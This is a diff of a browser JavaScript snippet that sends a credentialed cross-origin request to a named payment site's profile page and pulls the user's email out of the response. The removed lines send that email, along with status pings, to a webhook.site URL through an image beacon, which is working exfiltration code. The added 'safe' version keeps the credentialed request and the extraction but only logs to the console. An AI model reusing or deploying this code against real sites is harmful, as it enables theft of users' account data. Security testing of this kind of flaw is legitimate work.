@@ -1,42 +1,47 @@
+// safe-xhr-debug.js — benign diagnostics only (no exfiltration)
 (function(){
   try {
     var TARGET = "https://epay2-preprod.efinance.com.eg/ePay/EditProfile.do?method=preEditProfile&STYLE_TYPE=0";
-    var WEBHOOK = "https://webhook.site/fd927130-bc42-4bf4-81a8-e4b93d169ac2";
+
     var xhr = new XMLHttpRequest();
     xhr.open("GET", TARGET, true);
-    xhr.withCredentials = true;
-    xhr.timeout = 10000;
+    xhr.withCredentials = true; // include cookies
+    // optional timeout
+    xhr.timeout = 10000; // 10s
 
     xhr.onreadystatechange = function() {
       if (xhr.readyState !== 4) return;
+      console.info("[SAFE-XHR] readyState=4, status=", xhr.status);
 
-      var email = "";
+      // If CORS denied the response, status might be 0 or the body inaccessible.
+      // Try to read responseText, but this will throw / be empty if CORS blocked.
       try {
-        var doc = new DOMParser().parseFromString(xhr.responseText || "", "text/html");
-        var inp = doc.querySelector('input[name="email"], input[name=email]');
-        email = inp ? (inp.value || inp.getAttribute("value") || "") : "";
+        var txt = xhr.responseText || "";
+        console.info("[SAFE-XHR] response length:", txt.length);
+        console.info("[SAFE-XHR] preview:", txt.slice(0,500));
+
+        // parse with DOMParser
+        try {
+          var doc = new DOMParser().parseFromString(txt, "text/html");
+          var inp = doc.querySelector('input[name="email"], input[name=email]');
+          var email = inp ? (inp.value || inp.getAttribute('value') || "") : null;
+          console.info("[SAFE-XHR] extracted email (from fetched HTML):", email);
+        } catch (pe) {
+          console.warn("[SAFE-XHR] DOMParser parse error:", pe);
+        }
+
       } catch (e) {
-        email = "";
+        console.warn("[SAFE-XHR] cannot read responseText. Probably CORS/opaque response.", e);
       }
-
-      // Send email as GET param using image beacon (simple, CORS-agnostic)
-      var img = new window.Image();
-      img.src = WEBHOOK + "?email=" + encodeURIComponent(email);
     };
 
-    xhr.ontimeout = function(){
-      var img = new window.Image();
-      img.src = WEBHOOK + "?status=timeout";
-    };
+    xhr.ontimeout = function(){ console.warn("[SAFE-XHR] request timed out"); };
+    xhr.onerror = function(e){ console.error("[SAFE-XHR] XHR error", e); };
 
-    xhr.onerror = function(e){
-      var img = new window.Image();
-      img.src = WEBHOOK + "?status=xhrerror";
-    };
-
+    // send request
     xhr.send();
+    console.info("[SAFE-XHR] request sent to", TARGET, "(withCredentials=true). Check Network tab for Cookie header)");
   } catch (err) {
-    var img = new window.Image();
-    img.src = WEBHOOK + "?status=exception";
+    console.error("[SAFE-XHR] exception", err);
   }
 })();
